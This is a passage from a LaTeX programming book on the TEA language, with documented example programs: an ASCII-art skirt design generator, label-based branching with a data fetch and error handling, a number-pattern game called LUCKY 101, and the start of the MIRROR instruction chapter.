\vspace{2em}

Talking of which, a good and non-trivial example application leveraging \texttt{K:} that we have already encountered in this book, is that of the \textbf{magical language transformer}\cite{lutalo_2025_grimlumtauto} --- \textbf{LUMTAUTO}, covered in \textbf{\hyperref[SECEXAMP12]{Section \ref{SECEXAMP12}}}. However, in this next section, we shall especially call out a case whose operations significantly hinge on use of this command.


\subsection{EXAMPLE 1: \textbf{COMPUTATIONAL FINE-ART:} SKIRT DESIGNING PROGRAM}
\label{SECEXAMP1K}


The following program is one of the interesting cases of doing \textbf{image generation} using TEA programming. The program originally was but a simple little script part of the original examples of using TEA on the original TTTT mobile app with a limited instruction set, but has now been evolved and enhanced so that it applies some useful logic and design constraints such as not allowing empty or very short skirt designs, but also that the designs thus computed are presented in a symmetrical pattern and with the skirt properly displayed with its top and bottom well aligned in portrait mode.

\vspace{2em}

The designs are simple, and shall appear as a kind of \textbf{ASCII ART}, but otherwise, an interested tailor or designer can leverage the basic schematic presented, and from it develop a proper normal or extraordinary skirt design!

\vspace{2em}

The essential TEA source code for this program is as shown hereafter...


\vspace{2em}


%\begin{figure}[H]
{
  \begin{tcolorbox}[teaterminalstyle, title=TEA Program: SKIRT DESIGN IMAGE GENERATOR, breakable]
  \begin{lstlisting}[language=TEA,breaklines=true,numbers=left]
#====| THE SKIRT DESIGNER |====
#===============================
#Constants we'll need
v:vN_MIN_HEIGHT:{5} #minimum skirt height
#skip triangle apex by height to form proper skirt shape
v:vN_SKIP_HEIGHT:{2} 
v:vOP_LT:{<} #operator for comparison
v:vOP_INCR:{+1} #increment by 1

#Fist, GENERATE BASELINE SKIRT PATTERN
l:lGEN
i!:*-*
r!:\*:{--
--*}
a!:
k:^[*].*
a!:
t!:
m: | h!:{ } 
v:vSKIRT_PATTERN #now store that pattern
t.!: 
f:^$:lGEN # incase its empty, re-generate

#=====================================
#Then, take that 1-sided pattern and
#build a symmetrical pattern from it
#=====================================
v:vSKIRT:{}
v:vNL:{
}
y:vSKIRT_PATTERN | v:vINDATA_ORIG

l:lPREPROCESS
r!:{\n}:{#} #insert marker where newlines were
v:vMARKED_PATTERN
d!:{#} | v: | y!: | v:vN_HEIGHT | #compute and store height of skirt

#test if skirt height is okay, regenerate if skirt too short
g*:{}:vN_HEIGHT:vOP_LT:vN_MIN_HEIGHT  | r.: | f:^true$:lGEN

#skirt is of proper height, can proceed...
y:vMARKED_PATTERN
h!:{#}
v:vINDATA

#----| Start Constructing Skirt Pattern Line-by-Line |----
v:vN_LINE_INDEX:{0}
l:lSTART
y:vINDATA
f:^$:lFINISH

k!:{#} #keep lines without the marker
v:vLINE | t.!: # trim leading white-space...
#then build symmetrical pattern...
m!: | v:vLINEMIRROR | g*:{}:vLINE:vLINEMIRROR | v:vSYMLINE

#test if we should skip current line or not
g*:{}:vN_LINE_INDEX:vOP_LT:vN_SKIP_HEIGHT  | r.: | f:^true$:lSKIP:lADDLINE
l:lADDLINE
g*:{}:vSKIRT:vSYMLINE:vNL | v:vSKIRT

l:lSKIP
#increment line counter
g*:{}:vN_LINE_INDEX:vOP_INCR| r.: | v:vN_LINE_INDEX

y:vINDATA
k:{#} #only keep marked lines
#only remove first marker
r:{#}:{}
d:^[ ]* # and trim out leading white-space...
v:vINDATA #update data to process
j:lSTART #iterate!

#--------------------------
#Present Final Skirt Design
#--------------------------
l:lFINISH
y:vSKIRT | t.: 
   \end{lstlisting}
  \end{tcolorbox}
    \captionof{figure}{TEA EXAMPLE: SKIRT DESIGN IMAGE GENERATOR}
  \label{FIGKEX1}
  \vspace{1cm}


}
 %\centering  
 \raggedright %force normal/left-alignment  
  

We can appreciate the designs this program might inspire, as shown in the following example outputs of running that program ---- note that it currently accepts no user inputs or parameters, though, a concerned designer or user might tweak some of the key algorithm parameters directly in the code such as the minimum baseline-skirt-height (\texttt{v:vN\_MIN\_HEIGHT:{5}}) and closely related, and perhaps for designing \textbf{mini-skirts}, increasing the value of the skip parameter (\texttt{v:vN\_SKIP\_HEIGHT:{2}}) --- which, for meaningful designs, should not exceed the value of the minimum baseline-skirt-height. That said, checkout the skirt designs using the defaults and some customized configurations...


\vspace{2em}


\begin{figure}[H]
\LARGE
  \centering
  \begin{tcolorbox}[myterminalstyle, title=TEA Output from \textbf{\autoref{FIGKEX1}} --- SKIRT DESIGN GENERATOR]
  \begin{lstlisting}
 
    ------    
   ---**---   
  ---*--*---  
 ---*----*--- 
---*--**--*---
             
  \end{lstlisting}
  \end{tcolorbox}
  \caption{TEA EXAMPLE OUTPUT: SKIRT DESIGN 1 --- a mini-skirt}
\end{figure}


\begin{figure}[H]
\LARGE
  \centering
  \begin{tcolorbox}[myterminalstyle, title=TEA Output from \textbf{\autoref{FIGKEX1}} --- SKIRT DESIGN GENERATOR]
  \begin{lstlisting}
 
     *-**-*     
     *-**-*     
       --       
     *-**-*     
      ----      
     *-**-*     
     ------     
     *-**-*     
    --------    
     *-**-*     
   ----------   
     *-**-*     
  ------------  
     *-**-*     
 -------------- 
     *-**-*     
----------------
     *-**-*     
                
             
  \end{lstlisting}
  \end{tcolorbox}
  \caption{TEA EXAMPLE OUTPUT: SKIRT DESIGN 2 --- almost looks like a dress!}
\end{figure}


\begin{figure}[H]
\LARGE
  \centering
  \begin{tcolorbox}[myterminalstyle, title=TEA Output from \textbf{\autoref{FIGKEX1}} --- SKIRT DESIGN GENERATOR]
  \begin{lstlisting}
 
      -*--*-      
     -*----*-     
    -*--**--*-    
   -*--*--*--*-   
  -*--*----*--*-  
 -*--*------*--*- 
-*--*--------*--*-
                  
             
  \end{lstlisting}
  \end{tcolorbox}
  \caption{TEA EXAMPLE OUTPUT: SKIRT DESIGN 3 --- a decorated skirt}
\end{figure}


\begin{figure}[H]
\LARGE
  \centering
  \begin{tcolorbox}[myterminalstyle, title=TEA Output from \textbf{\autoref{FIGKEX1}} --- SKIRT DESIGN GENERATOR]
  \begin{lstlisting}
 
    ------    
   --------   
  ----------  
 -----**----- 
-----****-----
                       
             
  \end{lstlisting}
  \end{tcolorbox}
  \caption{TEA EXAMPLE OUTPUT: SKIRT DESIGN 4 --- a plain skirt with frontal decoration}
\end{figure}


\vspace{2em}

For purposes of helping put this application and associated research into perspective, note that part of the team at Nuchwezi Research has been significantly invested in studying and exploring art and fashion concepts via the \textbf{Menuza Bytes}\footnote{Refer to \url{https://menuzabytes.nuchwezi.com}} shop (an ICT-driven art, fashion and souvenir items outlet that is also a subsidiary of parent company Nuchwezi). And among popular items usually exhibited or stocked at Menuza Bytes, are especially fashion items for girls --- see examples in \textbf{\hyperref[FIGKEX1]{Figure \ref{FIGKEX1}}} and \textbf{\hyperref[FIGKEX2]{Figure \ref{FIGKEX2}}}, so that, one might sometimes assume that Nuchwezi has indeed conducted sufficient research on not only the computerized generation of girl's skirt designs, but also in their careful/thoughtful identification!


\begin{figure}[H]
  \begin{center}
   \includegraphics[height=0.9\textheight]{resources/images/skirt_detection}\\
   \caption{A Computer Vision simulation of successfully identifying a SKIRT with high confidence}
  \label{FIGKEX1}
  \end{center}
\end{figure}


\begin{figure}[H]
  \begin{center}
   \includegraphics[height=0.9\textheight]{resources/images/skirt_failed_detection}\\
   \caption{A Computer Vision simulation of successfully identifying an ``INVALID SKIRT" with alternative classification shown.}
  \label{FIGKEX2}
  \end{center}
\end{figure}



%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
% TAZ SECTION: L
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
\chapter{L: LABEL}
\label{SECL}


\begin{table}[H]
  \centering
  \LARGE
	\begin{tabular}[t]{|p{0.2\textwidth}|p{0.5\textwidth}}
 
	\textbf{NAME} & \texttt{LABEL}\\
	\hline
	\textbf{Purpose} & \begin{enumerate}
	\item Explicitly mark sections in a TEA Program accessible by unique names
	\item \textbf{Facilitate Conditional Branching} --- {\small only TEA instruction that does this}
	\item Create Code-Blocks or Label-Blocks
	\item TEA facility to enable code encapsulation
	\item A Primitive Procedure or Function Facility
	\item Allowing Computable Formalisms like Procedural Polymorphism
	\end{enumerate}\\
	\hline
	              
\end{tabular}
\caption{General Objectives of TEA Primitive \textbf{L:}}
  \label{TABTAZL}
\end{table}


\section{SEMANTICS of L:}
\label{SECSEML}


\begin{table}[H]
\centering
\renewcommand{\arraystretch}{1.3} % Optional: increases row height
\rowcolors{1}{lightgray}{white}   % Alternating row colors
\begin{tabular}{>{\bfseries}m{0.3\linewidth} | m{0.6\linewidth}} % 2 columns, 
\rowcolor{white}
\textbf{\makecell[l]{INSTRUCTION\\ SIGNATURE}} & \textbf{INSTRUCTION FUNCTION} \\
\hline

L: & INERT\\

\rowcolor{lightgray}\bfseries \makecell[l]{ L:LABEL } & Declare a jump position in a TEA program accessible by the name LABEL\\

L!: & INERT\\

\rowcolor{lightgray}\bfseries \makecell[l]{L!:LABEL\\L!:LABEL1:LABEL2:LABEL3:..:LABELN} & Similar to L:, but allows for the same position in the program to be accessible using any of the specified label names or tags, which are expected to be unique not only across the list, but also across the entire TEA Program.\\

 
 \hline
\end{tabular}
\caption{The Semantics of L:}
\label{TABSEML}
\end{table}


\section{NOTES about L:}
\label{SECNOTEL}



Note that for the overloadable TEA Label construct \textbf{L!:}, any branching command that references any of the label values in the label set expression for a particular l!: in the TEA program, makes the program jump there irrespective of which of the names was used. This allows TEA programs to implement useful ideas such as functions, polymorphism, more humane-APIs, etc.

\vspace{2em}

Also, note that, to emphasize this important TEA feature, only the Inverse Label construct allows overloading, much as both the \texttt{l:LABEL} and \texttt{l!:LABEL} constructs work the same for singular labels. The following is a non-trivial example of how labeling solves problems: in TEA programming:



\vspace{2em}


\begin{figure}[H]
 \Large
  \centering
  \begin{tcolorbox}[teaterminalstyle, title=L: EXAMPLE 1]
  \begin{lstlisting}[language=TEA]
# TEA data processing program
# with some kind of error handling

v:vLOG:{--No Processing Yet--} 

#start block to process fetching data online
l:FETCH
# required to be some non-empty result
w!: https://pastebin.org/KYC.csv 

# test what we obtained...
f!:^$:lPROCESS:lERROR 

# we only reach this block if we got non-empty data
l:lPROCESS
v:vDATA # store data we got
z.:DATE | v:vDATE

#update log
v:vLOG:{--Finished Processing--} 

# now combine current date & logs with the data
g*:{
---
}:vDATA:vDATE:vLOG | q!: | # end by returning data report

# we only reach this block if we didn't get data
l:lERROR 
v:vERROR:{--Data Access Error--}
g*:{
***
}:vLOG:vERROR | v:vLOG | # update the log
#j:FETCH | # then re-try the data processing
   \end{lstlisting}
  \end{tcolorbox}
\end{figure}


\vspace{2em}



When we test that program via WEB TEA, and there is no connection, it shall get us an output such as:


  \begin{tcbverbatim}[title=Example 1: Sample Output ]
[ERROR]: NetworkError: A network error occurred.
---
Tuesday, 09 December 2025
---
--Finished Processing--
  \end{tcbverbatim}


\vspace{2em}

While, on the CLI TEA, with still no network access, we result would be as:


  \begin{tcbverbatim}[title=Example 1: Sample Output ]
[ERROR]: <urlopen error [Errno -3] Temporary failure in name resolution>

---

Tuesday, 09 December 2025

---

--Finished Processing--
  \end{tcbverbatim}



Of course, both examples are results of our having entered the code-block named \textbf{lPROCESS}, which, we are able to access via the conditional branching instruction ``\verb|f!:^$:lPROCESS:lERROR|" because, despite there being no network access, the underlying WEB processing TEA instruction that we invoked before processing that instruction did indeed return a non-empty error result that we see displayed as the first sentence in the sample outputs shown.




\section{EXAMPLE APPLICATIONS of L:}
\label{SECEXAMPL}

  
Especially because the \textbf{LABEL} instruction is best appreciated via its use in controlling branching and control-flow points around a TEA program, the serious example application we are going to look at is for a scenario that naturally involves lots of branching and requires proper control-flow as well as functional programming or rather, named procedures. We are going to consider the case of an interactive computer game.



\subsection{EXAMPLE 1: \textbf{GAME PROGRAMMING:} TEXT-BASED BRAIN-GAME: LUCKY 101}
\label{SECEXAMP1L}


This game is somewhat based on text-role-playing such as we saw with \textbf{Boobs 'N' Traps} --- see  \textbf{\hyperref[SECEXAMP1H]{Section \ref{SECEXAMP1H}}}. However, this one is a game focused on mathematical skills and basic pattern-matching. The game is called \textbf{LUCKY 101}, and is about presenting the player with a series of number sequences, each of which consists of several single digits placed adjacent to each other, and which, the player must study, and then determine which of the neighboring digits form a pattern that would win with the highest score, which they then report to the game so as to score.

\vspace{2em}

In this particular instance of \textbf{LUCKY 101}, the score conditions are pretty simple:

\begin{enumerate}
\item You are required to identify any correct \textbf{Triple} of Digits in the presented field.
\item The triple is required to conform to the pattern \textbf{ODD-EVEN-ODD} such as the triples ``101", ``183", ``947", etc.
\item For the correct triple you identify in the field, your score is the arithmetic sum of the digits in the identified triple.
\item In case you report a triple that actually exists but does not conform to the required pattern, you are penalized by -2.
\item In case you enter some gibberish or a non-triple result, you are penalized by -5.
\item At any moment, you can quit the game by simply entering ``q" or ``Q".
\item At every other correct move, you overall score grows by the new points obtained, while, any invalid move reduces your overall score by the penalty points.
\end{enumerate}


\vspace{2em}


This game has been designed to be playable via a graphical user interface (GUI), just like we saw with Boobs N Traps, and so, one can readily play it via a command-line TEA program, but which shall present a GUI, or via the WEB TEA interface, which shall still present it via an interactive UI.

\vspace{2em}


The essential code, also left commented to help the student or reviewer study the use of \textbf{Label Blocks} among other TEA quirks, is as presented hereafter..



 %\begin{figure}[H]
{
 \small
  \begin{tcolorbox}[teaterminalstyle, title=TEA Program: LUCKY 101 v1, breakable]
  \begin{lstlisting}[language=TEA,breaklines=true,numbers=left]
################################
####| LUCKY 101 GAME v.1 |####
################################
# This game is a simple, but rewarding 
# brain-game that rewards & teaches basic 
# pattern-matching skills and following instructions!
# ------| HOW TO PLAY? |-------------------
# Essentially, player is shown a field
# with multiple sequences of adjacent numbers
# and their objective should be to identify
# the best ODD-EVEN-ODD triplet. Your score
# is the sum of the correct triplet you identify.
# Thus, the larger, the better. You are penalized
# for picking a wrong triplet or invalid moves.
#########################################
# GAME ARCHITECT: Prof. JWL (Nuchwezi Research)
#########################################

#---| CONSTANTS and VARIABLES |-----
v:vN_OP_SCORE:{0}
v:vN_OP_MOVES:{0}
v:vINCR_1:{1}
v:vN_ROWS:{3}
v:vN_COLS:{30}
v:vSYM_FIELD:{_}
v:vSYM_DIV_COL:{=}
v:vSYM_DIV_ROW:{@}
v:vOP_ADD:{+}
v:vTEST_CMD_GTE:{__ >= ~}
v:vCMD_SUBTRACT:{__ - ~}
v:vCMD_ADD:{__ + ~}
v:vTEST_P1:{__}
v:vTEST_P2:{~}
v:vMSG_OP_STATUS:{Ready to Play}
v:vPENALTY:{5}
v:vPENALTY_WRONG_TRIPLE:{2}


##############################
# CONSTRUCT NEW FIELD
##############################
l:lNEWFIELD

v:vFIELD:{}
l:lSTART

#---| Build a Lane |-----
l:lSTARTROW
v:vNEWLANE:{}
x*:vNEWLANE:vSYM_DIV_ROW| v:vNEWLANE

l:lEXTEND # start extending current row
n: | v:vN_RNG
x*:vNEWLANE:vN_RNG | v:vNEWLANE
x*:vNEWLANE:vSYM_DIV_COL | v:vNEWLANE
y!:vNEWLANE| v:vN_LEN_FIELD
r*:vTEST_CMD_GTE:vTEST_P1:vN_LEN_FIELD | v:vTEST_CMD
r*:vTEST_CMD:vTEST_P2:vN_COLS | v:vTEST_CMD
y:vTEST_CMD | r.: | f:^false$:lEXTEND:lNEXTROW

l:lNEXTROW

y:vFIELD
d*!:vSYM_DIV_ROW | v: | v!: | v:vLEN_ROWS

r*:vTEST_CMD_GTE:vTEST_P1:vLEN_ROWS | v:vTEST_CMD
r*:vTEST_CMD:vTEST_P2:vN_ROWS | v:vTEST_CMD
y:vTEST_CMD | r.: | f:^false$:lSTARTNEXTROW:lFIELDCOMPLETE

#---| Adding More Lanes |-----
l:lSTARTNEXTROW
x*:vFIELD:vNEWLANE | v:vFIELD
#q!:
j:lSTARTROW # loop: to build next row

#---| Building Field Complete |-----
l:lFIELDCOMPLETE
h*!:vFIELD:vSYM_DIV_ROW

#------------------------------
#----| PROGRAM GAME PLAY |----
#------------------------------
#first, fetch the current field...
y:vFIELD 

#----| UPDATE field with lane-field |-----
y:vFIELD | h!:{@} | v:vFIELD


###############################
# GAME PLAY MODE
###############################
l:lPLAYMODE

#compute score metric
v:vMSG_OP_SCORE:{SCORE: }
y:vMSG_OP_SCORE | x*!:vN_OP_SCORE | v:vMSG_OP_SCORE

#----[ Prompt USER for THEIR MOVE ]
y:vFIELD
x:{
---| LUCKY 101 FIELD |---
} 
x!:{
---| MOVE [} | x*!:vN_OP_MOVES | x!:{] RULES |---
Identify an ODD-EVEN-ODD Triplet to Score its SUM
Q: to QUIT | }
| x*!:vMSG_OP_SCORE 
| x!:{ | STATUS: }
| x*!:vMSG_OP_STATUS 

#then display field and prompt
i*: | v:vPLAYCMD

#----| In-Case We Should Finish? |-----
f:^[qQ]$:lFINISH

###############################
#PROCESS USER INPUT/COMMAND...
#-----------------------------
y:vPLAYCMD

f:{^\d\d\d$}:lPROCESS_TRIPLE:lUNKNOWN_CMD 
l:lPROCESS_TRIPLE

y:vPLAYCMD | v:vTRIPLE | v:vTRIPLE_NUMBERS
#check if it exists in field..
y:vTRIPLE | h: | g*!:vSYM_DIV_COL | v:vTRIPLE
y:vFIELD | f*:vTRIPLE:lTRIPLE_FOUND:lTRIPLE_MISSING
l:lTRIPLE_FOUND

#y:vFIELD | d*!:vTRIPLE
#q!:

#is it odd-even-odd?
y:vTRIPLE_NUMBERS | f:[13579][02468][13579]:lPROCESS_TRIPLE_FOUND:lPENALIZE_TRIPLE_FOUND
l:lPROCESS_TRIPLE_FOUND

y:vTRIPLE_NUMBERS| h: | g*!:vOP_ADD | v:vTRIPLE_SUM
r.: | v:vTRIPLE_SUM
v:vMSG_OP_STATUS:{Scored +}| x*!:vTRIPLE_SUM:vMSG_OP_STATUS | x!:{ (CONGS on }| x*!:vTRIPLE_NUMBERS | x!:{!)} | v:vMSG_OP_STATUS

r*:vCMD_ADD:vTEST_P1:vN_OP_SCORE | v:vSCORE_CMD
r*:vSCORE_CMD:vTEST_P2:vTRIPLE_SUM | v:vSCORE_CMD
y:vSCORE_CMD| r.: | v:vN_OP_SCORE 

#---| UPDATE MOVE COUNTS |----
r*:vCMD_ADD:vTEST_P1:vN_OP_MOVES | v:vMOVE_CMD
r*:vMOVE_CMD:vTEST_P2:vINCR_1 | v:vMOVE_CMD
y:vMOVE_CMD| r.: | v:vN_OP_MOVES

###########| WON! can reset field for next move... |#####
j:lNEWFIELD

#----| In case WRONG Input was PROVIDED |-----
l:lPENALIZE_TRIPLE_FOUND
l:lTRIPLE_MISSING
v:vMSG_OP_STATUS:{Penalized -2 (INVALID triple } | x*!:vTRIPLE_NUMBERS:vMSG_OP_STATUS | x!:{)} | v:vMSG_OP_STATUS

r*:vCMD_SUBTRACT:vTEST_P1:vN_OP_SCORE | v:vPENALIZE_CMD
r*:vPENALIZE_CMD:vTEST_P2:vPENALTY_WRONG_TRIPLE | v:vPENALIZE_CMD
y:vPENALIZE_CMD| r.: | v:vN_OP_SCORE 
j:lSCORING_COMPLETE

l:lUNKNOWN_CMD # we couldn't process the command..
v:vMSG_OP_STATUS:{Penalized -5 (WRONG move)}

r*:vCMD_SUBTRACT:vTEST_P1:vN_OP_SCORE | v:vPENALIZE_CMD
r*:vPENALIZE_CMD:vTEST_P2:vPENALTY | v:vPENALIZE_CMD
y:vPENALIZE_CMD| r.: | v:vN_OP_SCORE 

l:lSCORING_COMPLETE


#---| UPDATE MOVE COUNTS |----
r*:vCMD_ADD:vTEST_P1:vN_OP_MOVES | v:vMOVE_CMD
r*:vMOVE_CMD:vTEST_P2:vINCR_1 | v:vMOVE_CMD
y:vMOVE_CMD| r.: | v:vN_OP_MOVES

j:lPLAYMODE #loop game mode...


###############################
# FINISH GAME
###############################
l:lFINISH
i!:{GAME OVER AFTER } | x*!:vN_OP_MOVES | x!:{ MOVES!} | v:vMSG_OP_STATUS
y:vFIELD
x!:{
---| THANKS for PLAYING LUCKY 101! |---
}
| x*!:vMSG_OP_SCORE 
| x!:{ | STATUS: }
| x*!:vMSG_OP_STATUS 

#That's it! SEND BUG REPORTS to DEV:
#Joseph W.: joewillrich@gmail.com
   \end{lstlisting}
  \end{tcolorbox}
    \captionof{figure}{TEA EXAMPLE: LUCKY 101 v1}
  \label{FIGL1}
  \vspace{1cm}


}
 %\centering  
 \raggedright %force normal/left-alignment  
  
 
 \textbf{\hyperref[FIGL1]{Figure \ref{FIGL1}}} is the latest (\textbf{source-code}) edition of this game as of this writing --- \textbf{LUCKY 101 v1}. However, for a more up-to-date edition, or in case one wishes to look at the code, modify or run it like on the Linux, Unix, Windows of MAC OS command-line on the WEB, the most recent version should be what you might find or run directly and live via:
  
  
\vspace{1em}

 \url{https://tea.nuchwezi.com/?i=.&fc=https://gist.githubusercontent.com/mcnemesis/cd710b7713232f495d45156e610bfb3f/raw/lucky_101_game.tea}

\vspace{1em}


\textbf{ALTERNATIVELY} just use the short-link: \url{https://bit.ly/lucky101game}

Example screenshots of this game in use are shown hereafter...


\begin{figure}[H]
  \begin{center}
   \includegraphics[]{resources/images/lucky_101_game_landing_screen.png}\\
   \caption{LUCKY 101 game landing screen}
  \label{FIGLUCK101}
  \end{center}
\end{figure}


\begin{figure}[H]
  \begin{center}
   \includegraphics[]{resources/images/lucky_101_game_session_screen.png}\\
   \caption{LUCKY 101 game session screen}
  \label{FIGLUCK102}
  \end{center}
\end{figure}


\begin{figure}[H]
  \begin{center}
   \includegraphics[]{resources/images/lucky_101_game_final_screen.png}\\
   \caption{LUCKY 101 game FINAL screen}
  \label{FIGLUCK103}
  \end{center}
\end{figure}


\vspace{2em}

For the clean and minified version of the \textbf{LUCKY 101} brain-game, the following code snippet is based on the v1.0 of the game invented by \textbf{Prof. J. Willrich}, and which is also based on the original TEA source shared on the \textbf{UIC} --- inner Uganda Internet Community\footnote{Refer to \texttt{\url{https://t.me/ugandanow/5155}} | but also on \textbf{Blackboard Adventures}: \texttt{\url{https://t.me/bclectures/1158}} }, circa December 2025.

\vspace{2em}

{
 %\small
  \begin{tcolorbox}[teaterminalstyle, title=CLEAN TEA Program: The High-Order Transformer: LUCKY 101 Brain-Game, breakable]
  %\begin{lstlisting}[language=TEA, caption={TP C7}, label={LSTC7}, numbers=left]
  \begin{lstlisting}[language=TEA,breaklines=true]
v:vN_OP_SCORE:{0}|v:vN_OP_MOVES:{0}|v:vINCR_1:{1}|v:vN_ROWS:{3}|v:vN_COLS:{30}|v:vSYM_FIELD:{_}|v:vSYM_DIV_COL:{=}|v:vSYM_DIV_ROW:{@}|v:vOP_ADD:{+}|v:vTEST_CMD_GTE:{__ >= ~}|v:vCMD_SUBTRACT:{__ - ~}|v:vCMD_ADD:{__ + ~}|v:vTEST_P1:{__}|v:vTEST_P2:{~}|v:vMSG_OP_STATUS:{Ready to Play}|v:vPENALTY:{5}|v:vPENALTY_WRONG_TRIPLE:{2}|l:lNEWFIELD|v:vFIELD:{}|l:lSTART|l:lSTARTROW|v:vNEWLANE:{}|x*:vNEWLANE:vSYM_DIV_ROW|v:vNEWLANE|l:lEXTEND|n:|v:vN_RNG|x*:vNEWLANE:vN_RNG|v:vNEWLANE|x*:vNEWLANE:vSYM_DIV_COL|v:vNEWLANE|y!:vNEWLANE|v:vN_LEN_FIELD|r*:vTEST_CMD_GTE:vTEST_P1:vN_LEN_FIELD|v:vTEST_CMD|r*:vTEST_CMD:vTEST_P2:vN_COLS|v:vTEST_CMD|y:vTEST_CMD|r.:|f:^false$:lEXTEND:lNEXTROW|l:lNEXTROW|y:vFIELD|d*!:vSYM_DIV_ROW|v:|v!:|v:vLEN_ROWS|r*:vTEST_CMD_GTE:vTEST_P1:vLEN_ROWS|v:vTEST_CMD|r*:vTEST_CMD:vTEST_P2:vN_ROWS|v:vTEST_CMD|y:vTEST_CMD|r.:|f:^false$:lSTARTNEXTROW:lFIELDCOMPLETE|l:lSTARTNEXTROW|x*:vFIELD:vNEWLANE|v:vFIELD|j:lSTARTROW|l:lFIELDCOMPLETE|h*!:vFIELD:vSYM_DIV_ROW|y:vFIELD|y:vFIELD|h!:{@}|v:vFIELD|l:lPLAYMODE|v:vMSG_OP_SCORE:{SCORE: }|y:vMSG_OP_SCORE|x*!:vN_OP_SCORE|v:vMSG_OP_SCORE|y:vFIELD|x:{
---| LUCKY 101 FIELD |---
}|x!:{
---| MOVE [}|x*!:vN_OP_MOVES|x!:{] RULES |---
Identify an ODD-EVEN-ODD Triplet to Score its SUM
Q: to QUIT | }|x*!:vMSG_OP_SCORE|x!:{ | STATUS: }|x*!:vMSG_OP_STATUS|i*:|v:vPLAYCMD|f:^[qQ]$:lFINISH|y:vPLAYCMD|f:{^\d\d\d$}:lPROCESS_TRIPLE:lUNKNOWN_CMD|l:lPROCESS_TRIPLE|y:vPLAYCMD|v:vTRIPLE|v:vTRIPLE_NUMBERS|y:vTRIPLE|h:|g*!:vSYM_DIV_COL|v:vTRIPLE|y:vFIELD|f*:vTRIPLE:lTRIPLE_FOUND:lTRIPLE_MISSING|l:lTRIPLE_FOUND|y:vTRIPLE_NUMBERS|f:[13579][02468][13579]:lPROCESS_TRIPLE_FOUND:lPENALIZE_TRIPLE_FOUND|l:lPROCESS_TRIPLE_FOUND|y:vTRIPLE_NUMBERS|h:|g*!:vOP_ADD|v:vTRIPLE_SUM|r.:|v:vTRIPLE_SUM|v:vMSG_OP_STATUS:{Scored +}|x*!:vTRIPLE_SUM:vMSG_OP_STATUS|x!:{ (CONGS on }|x*!:vTRIPLE_NUMBERS|x!:{!)}|v:vMSG_OP_STATUS|r*:vCMD_ADD:vTEST_P1:vN_OP_SCORE|v:vSCORE_CMD|r*:vSCORE_CMD:vTEST_P2:vTRIPLE_SUM|v:vSCORE_CMD|y:vSCORE_CMD|r.:|v:vN_OP_SCORE|r*:vCMD_ADD:vTEST_P1:vN_OP_MOVES|v:vMOVE_CMD|r*:vMOVE_CMD:vTEST_P2:vINCR_1|v:vMOVE_CMD|y:vMOVE_CMD|r.:|v:vN_OP_MOVES|j:lNEWFIELD|l:lPENALIZE_TRIPLE_FOUND|l:lTRIPLE_MISSING|v:vMSG_OP_STATUS:{Penalized -2 (INVALID triple }|x*!:vTRIPLE_NUMBERS:vMSG_OP_STATUS|x!:{)}|v:vMSG_OP_STATUS|r*:vCMD_SUBTRACT:vTEST_P1:vN_OP_SCORE|v:vPENALIZE_CMD|r*:vPENALIZE_CMD:vTEST_P2:vPENALTY_WRONG_TRIPLE|v:vPENALIZE_CMD|y:vPENALIZE_CMD|r.:|v:vN_OP_SCORE|j:lSCORING_COMPLETE|l:lUNKNOWN_CMD|v:vMSG_OP_STATUS:{Penalized -5 (WRONG move)}|r*:vCMD_SUBTRACT:vTEST_P1:vN_OP_SCORE|v:vPENALIZE_CMD|r*:vPENALIZE_CMD:vTEST_P2:vPENALTY|v:vPENALIZE_CMD|y:vPENALIZE_CMD|r.:|v:vN_OP_SCORE|l:lSCORING_COMPLETE|r*:vCMD_ADD:vTEST_P1:vN_OP_MOVES|v:vMOVE_CMD|r*:vMOVE_CMD:vTEST_P2:vINCR_1|v:vMOVE_CMD|y:vMOVE_CMD|r.:|v:vN_OP_MOVES|j:lPLAYMODE|l:lFINISH|i!:{GAME OVER AFTER }|x*!:vN_OP_MOVES|x!:{ MOVES!}|v:vMSG_OP_STATUS|y:vFIELD|x!:{
---| THANKS for PLAYING LUCKY 101! |---
}|x*!:vMSG_OP_SCORE|x!:{ | STATUS: }|x*!:vMSG_OP_STATUS
   \end{lstlisting}
  \end{tcolorbox}
    \captionof{figure}{MINIFIED TEA Program: LUCKY 101 Brain-Game program source-code}
  \label{FIGLUCKY101CODE_CLEAN}
  }
  
  
\vspace{2em}




%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
% TAZ SECTION: M
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
\chapter{M: MIRROR}
\label{SECM}


\begin{table}[H]
  \centering
  \LARGE
	\begin{tabular}[t]{|p{0.2\textwidth}|p{0.5\textwidth}}
 
	\textbf{NAME} & \texttt{MIRROR}\\
	\hline
	\textbf{Purpose} & \begin{enumerate}
	\item Return the AI reflected about some axis
	\item Laterally invert text.
	\item Reverse the order of ordered symbols.
	\item Reverse the order of ordered words.
	\item Facilitate vertical inversion of multi-line text --- useful in ASCII ART
	\end{enumerate}\\
	\hline
	              
\end{tabular}
\caption{General Objectives of TEA Primitive \textbf{M:}}
  \label{TABTAZM}
\end{table}


\section{SEMANTICS of M:}
\label{SECSEMM}


\begin{table}[H]
\centering
\renewcommand{\arraystretch}{1.3} % Optional: increases row height
\rowcolors{1}{lightgray}{white}   % Alternating row colors
\begin{tabular}{>{\bfseries}m{0.3\linewidth} | m{0.6\linewidth}} % 2 columns, 
\rowcolor{white}
\textbf{\makecell[l]{INSTRUCTION\\ SIGNATURE}} & \textbf{INSTRUCTION FUNCTION} \\
\hline

m: & Set IO as the lateral reflection of words in AI about the string's origin\\

\rowcolor{lightgray}\bfseries \makecell[l]{ m:STR } & Same as m:, but operating on STR instead of AI\\

m!: & Set IO as the lateral reflection of everything (characters) in AI about the string's origin\\

\rowcolor{lightgray}\bfseries \makecell[l]{m!:STR} & Same as \texttt{m!:}, but operating on STR instead of AI\\


m*:vNAME & Same as m:STR, but using  the string stored in the vault with the name vNAME instead of AI. \textbf{Without vNAME, operates on the DEFAULT VAULT.}\\

\rowcolor{lightgray}\bfseries \makecell[l]{m*!:vNAME} & Same as m!:STR, but using  the string stored in the vault with the name vNAME instead of AI. Without vNAME, operates on the default vault.\\

 
 \hline
\end{tabular}
\caption{The Semantics of M:}
\label{TABSEMM}
\end{table}


\section{NOTES about M:}
\label{SECNOTEM}


